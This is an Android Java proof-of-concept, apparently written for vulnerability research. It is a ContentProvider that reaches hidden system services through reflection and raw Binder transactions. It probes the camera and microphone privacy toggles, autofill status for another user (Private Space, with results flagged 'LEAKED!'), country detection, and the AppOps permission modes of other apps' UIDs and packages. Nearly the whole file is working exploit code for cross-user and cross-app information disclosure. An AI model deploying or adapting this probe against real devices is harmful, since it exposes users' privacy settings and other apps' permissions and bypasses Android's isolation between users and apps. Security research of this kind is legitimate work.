package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class SensorPrivacyProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("sensor")) {
            probeSensorPrivacy(cursor);
        } else if (path != null && path.contains("autofill")) {
            probeAutofill(cursor);
        } else if (path != null && path.contains("country")) {
            probeCountryDetector(cursor);
        } else if (path != null && path.contains("appops")) {
            probeAppOps(cursor);
        } else {
            probeSensorPrivacy(cursor);
            probeAutofill(cursor);
            probeCountryDetector(cursor);
            probeAppOps(cursor);
        }

        return cursor;
    }

    private void probeSensorPrivacy(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("sensor_privacy");
        if (binder == null) { cursor.addRow(new Object[]{"sensor_priv", "no_binder"}); return; }
        String desc = "android.hardware.ISensorPrivacyManager";

        // ISensorPrivacyManager:
        // isSensorPrivacyEnabled() - is camera/mic globally muted?
        // isCombinedToggleSensorPrivacyEnabled(int sensor)
        // isToggleSensorPrivacyEnabled(int toggleType, int sensor)
        // These reveal if the user has disabled their camera or microphone
        // sensor: CAMERA=2, MICROPHONE=1

        // TX=1: supportsSensorToggle(int toggleType, int sensor) -> bool
        // TX=2: addSensorPrivacyListener(ISensorPrivacyListener) - register for changes
        // TX=3: removeSensorPrivacyListener(ISensorPrivacyListener)
        // TX=4: isSensorPrivacyEnabled() -> bool
        // TX=5: setSensorPrivacy(boolean enable)
        // TX=6: isToggleSensorPrivacyEnabled(int toggleType, int sensor) -> bool
        // TX=7: setToggleSensorPrivacy(int userId, int source, int sensor, boolean enable)
        // TX=8: isCombinedToggleSensorPrivacyEnabled(int sensor) -> bool

        // TX=4: isSensorPrivacyEnabled - reveals global sensor privacy state
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(4, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0 && reply.dataAvail() >= 4) {
                int enabled = reply.readInt();
                cursor.addRow(new Object[]{"sensorPrivacy_global", "enabled=" + (enabled != 0)});
            } else {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"sensorPrivacy_global", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"sensorPrivacy_global", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=6: isToggleSensorPrivacyEnabled(int toggleType, int sensor) -> bool
        // toggleType: SOFTWARE=1, HARDWARE=2
        // sensor: MICROPHONE=1, CAMERA=2
        int[][] combos = {{1, 1}, {1, 2}, {2, 1}, {2, 2}};
        String[] labels = {"sw_mic", "sw_cam", "hw_mic", "hw_cam"};
        for (int i = 0; i < combos.length; i++) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(combos[i][0]); // toggleType
                data.writeInt(combos[i][1]); // sensor
                binder.transact(6, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0 && reply.dataAvail() >= 4) {
                    int val = reply.readInt();
                    cursor.addRow(new Object[]{"sensor_" + labels[i], "muted=" + (val != 0)});
                } else {
                    String msg = null;
                    try { msg = reply.readString(); } catch (Exception ignored) {}
                    cursor.addRow(new Object[]{"sensor_" + labels[i], "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"sensor_" + labels[i], "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=8: isCombinedToggleSensorPrivacyEnabled(int sensor)
        for (int sensor : new int[]{1, 2}) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(sensor);
                binder.transact(8, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0 && reply.dataAvail() >= 4) {
                    int val = reply.readInt();
                    cursor.addRow(new Object[]{"sensor_combined_" + sensor, "muted=" + (val != 0)});
                } else {
                    String msg = null;
                    try { msg = reply.readString(); } catch (Exception ignored) {}
                    cursor.addRow(new Object[]{"sensor_combined_" + sensor, "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"sensor_combined_" + sensor, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=1: supportsSensorToggle
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(1); // SOFTWARE
            data.writeInt(2); // CAMERA
            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0 && reply.dataAvail() >= 4) {
                cursor.addRow(new Object[]{"supportsToggle", "val=" + reply.readInt()});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"supportsToggle", "ERR"});
        }
        data.recycle();
        reply.recycle();
    }

    private void probeAutofill(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("autofill");
        if (binder == null) { cursor.addRow(new Object[]{"autofill", "no_binder"}); return; }
        String desc = "android.view.autofill.IAutoFillManager";

        // IAutoFillManager:
        // TX=1: addClient(IAutoFillManagerClient, ComponentName, int userId, IResultReceiver)
        // TX=7: isServiceEnabled(int userId, String packageName) -> bool
        // TX=8: getAutofillServiceComponentName() -> ComponentName
        // TX=9: getAvailableFieldClassificationAlgorithms() -> String[]
        // TX=10: getDefaultFieldClassificationAlgorithm() -> String

        // TX=7: isServiceEnabled - reveals if autofill is configured for a user
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // userId
            data.writeString(getContext().getPackageName()); // packageName
            binder.transact(7, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0 && reply.dataAvail() >= 4) {
                int enabled = reply.readInt();
                cursor.addRow(new Object[]{"autofill_enabled_u0", "enabled=" + (enabled != 0)});
            } else {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"autofill_enabled_u0", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"autofill_enabled_u0", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Try for user 11 (Private Space)
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(11); // userId
            data.writeString(getContext().getPackageName());
            binder.transact(7, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0 && reply.dataAvail() >= 4) {
                int enabled = reply.readInt();
                cursor.addRow(new Object[]{"autofill_enabled_u11", "LEAKED! enabled=" + (enabled != 0)});
            } else {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"autofill_enabled_u11", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"autofill_enabled_u11", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Probe other TX codes
        for (int tx = 1; tx <= 12; tx++) {
            if (tx == 7) continue;
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0);
                data.writeString(getContext().getPackageName());
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    int ex = reply.readInt();
                    if (ex == 0 && reply.dataAvail() > 0) {
                        cursor.addRow(new Object[]{"af_tx" + tx, "OK avail=" + reply.dataAvail()});
                    }
                }
            } catch (Exception e) {
                // skip
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void probeCountryDetector(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("country_detector");
        if (binder == null) { cursor.addRow(new Object[]{"country", "no_binder"}); return; }
        String desc = "android.location.ICountryDetector";

        // ICountryDetector: detectCountry() -> Country
        // TX=1: detectCountry()
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                if (avail > 0) {
                    int nonNull = reply.readInt();
                    if (nonNull != 0) {
                        // Country parcelable: String countryIso, int source, long timestamp
                        String iso = reply.readString();
                        int source = reply.readInt();
                        long ts = reply.readLong();
                        cursor.addRow(new Object[]{"country", "iso=" + iso + " src=" + source + " ts=" + ts});
                    } else {
                        cursor.addRow(new Object[]{"country", "null"});
                    }
                } else {
                    cursor.addRow(new Object[]{"country", "OK avail=0"});
                }
            } else {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"country", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"country", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void probeAppOps(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("appops");
        if (binder == null) { cursor.addRow(new Object[]{"appops", "no_binder"}); return; }
        String desc = "com.android.internal.app.IAppOpsService";

        // IAppOpsService:
        // checkOperation(int code, int uid, String pkg) -> int mode
        // This can reveal whether other apps have specific operations allowed/denied
        // Without UPDATE_APP_OPS_STATS we can still CHECK
        // OP_CAMERA=26, OP_RECORD_AUDIO=27, OP_COARSE_LOCATION=0, OP_FINE_LOCATION=1
        // OP_READ_CONTACTS=4, OP_WRITE_CONTACTS=5, OP_READ_CALL_LOG=6

        // Try checkOperation for system_server (uid 1000)
        int[] ops = {0, 1, 4, 6, 26, 27, 40, 41, 69, 79};
        String[] opNames = {"COARSE_LOC", "FINE_LOC", "READ_CONTACTS", "READ_CALL_LOG",
                           "CAMERA", "RECORD_AUDIO", "AUDIO_NOTIF_VOL", "VIBRATE",
                           "READ_PHONE_STATE", "READ_PHONE_NUMBERS"};

        // TX=1: checkOperation(int code, int uid, String packageName)
        // Test with our own uid first
        int myUid = android.os.Process.myUid();
        for (int i = 0; i < ops.length; i++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(ops[i]); // op code
                data.writeInt(myUid);
                data.writeString(getContext().getPackageName());
                binder.transact(1, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0 && reply.dataAvail() >= 4) {
                    int mode = reply.readInt();
                    // MODE_ALLOWED=0, MODE_IGNORED=1, MODE_ERRORED=2, MODE_DEFAULT=3
                    cursor.addRow(new Object[]{"appop_own_" + opNames[i], "mode=" + mode});
                }
            } catch (Exception e) {
                // skip
            }
            data.recycle();
            reply.recycle();
        }

        // Cross-app AppOps checking - can we determine permission grants for other apps?
        // UIDs from doze whitelist: 10105(GMS), 10143(vending?), 10161, 10163, 10165, 10166
        int[] targetUids = {1000, 10105, 10143, 10161, 10163, 10165, 10166, 10197, 10275};
        // Important ops: CAMERA=26, RECORD_AUDIO=27, FINE_LOC=1, READ_SMS=14, WRITE_SMS=15
        // OP_POST_NOTIFICATION=11, OP_SYSTEM_ALERT_WINDOW=24, OP_READ_EXTERNAL=59
        int[][] opSets = {
            {26, 27, 1, 24}, // CAMERA, MIC, FINE_LOC, SYSTEM_ALERT
            {11, 14, 59, 79}  // POST_NOTIF, READ_SMS, READ_STORAGE, READ_PHONE_NUM
        };
        String[][] opLabels = {
            {"CAM", "MIC", "LOC", "SAW"},
            {"NOTIF", "SMS", "STORE", "PHONE"}
        };

        for (int targetUid : targetUids) {
            StringBuilder sb = new StringBuilder();
            for (int setIdx = 0; setIdx < opSets.length; setIdx++) {
                for (int opIdx = 0; opIdx < opSets[setIdx].length; opIdx++) {
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        data.writeInterfaceToken(desc);
                        data.writeInt(opSets[setIdx][opIdx]);
                        data.writeInt(targetUid);
                        data.writeString("?");
                        binder.transact(1, data, reply, 0);
                        int ex = reply.readInt();
                        if (ex == 0 && reply.dataAvail() >= 4) {
                            int mode = reply.readInt();
                            sb.append(opLabels[setIdx][opIdx]).append("=").append(mode).append(" ");
                        }
                    } catch (Exception e) {
                        sb.append(opLabels[setIdx][opIdx]).append("=E ");
                    }
                    data.recycle();
                    reply.recycle();
                }
            }
            cursor.addRow(new Object[]{"ops_uid" + targetUid, sb.toString().trim()});
        }

        // Also check with correct package names where we know them
        // com.google.android.gms is uid 10105 (from doze whitelist)
        String[] knownPkgs = {"com.google.android.gms", "com.android.chrome", "com.google.android.apps.messaging"};
        for (String pkg : knownPkgs) {
            StringBuilder sb = new StringBuilder();
            for (int op : new int[]{26, 27, 1, 11, 24}) { // CAM, MIC, LOC, NOTIF, SAW
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(desc);
                    data.writeInt(op);
                    data.writeInt(1000); // uid doesn't matter for package check?
                    data.writeString(pkg);
                    binder.transact(1, data, reply, 0);
                    int ex = reply.readInt();
                    if (ex == 0 && reply.dataAvail() >= 4) {
                        int mode = reply.readInt();
                        sb.append(op).append("=").append(mode).append(" ");
                    }
                } catch (Exception e) {
                    sb.append(op).append("=E ");
                }
                data.recycle();
                reply.recycle();
            }
            cursor.addRow(new Object[]{"ops_" + pkg.substring(pkg.lastIndexOf('.')+1), sb.toString().trim()});
        }

        // Critical test: try checkOperation on a package we KNOW has camera/mic (like Camera app)
        // com.google.android.GoogleCamera is likely the camera app
        String[] camPkgs = {"com.google.android.GoogleCamera", "com.google.android.apps.photos"};
        for (String pkg : camPkgs) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(26); // OP_CAMERA
                data.writeInt(0); // uid 0 = use package lookup
                data.writeString(pkg);
                binder.transact(1, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0 && reply.dataAvail() >= 4) {
                    int mode = reply.readInt();
                    cursor.addRow(new Object[]{"ops_cam_" + pkg.substring(pkg.lastIndexOf('.')+1), "mode=" + mode});
                } else {
                    String msg = null;
                    try { msg = reply.readString(); } catch (Exception ignored) {}
                    cursor.addRow(new Object[]{"ops_cam_" + pkg.substring(pkg.lastIndexOf('.')+1), "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"ops_cam_" + pkg.substring(pkg.lastIndexOf('.')+1), "ERR"});
            }
            data.recycle();
            reply.recycle();
        }

        // getOpsForPackage(int uid, String pkg, int[] ops) -> List<PackageOps>
        // TX=4 requires UPDATE_APP_OPS_STATS
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(1000);
            data.writeString("android");
            data.writeInt(-1); // null ops array
            binder.transact(4, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"getOpsForPkg_android", "OK avail=" + reply.dataAvail()});
            } else {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"getOpsForPkg_android", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getOpsForPkg_android", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
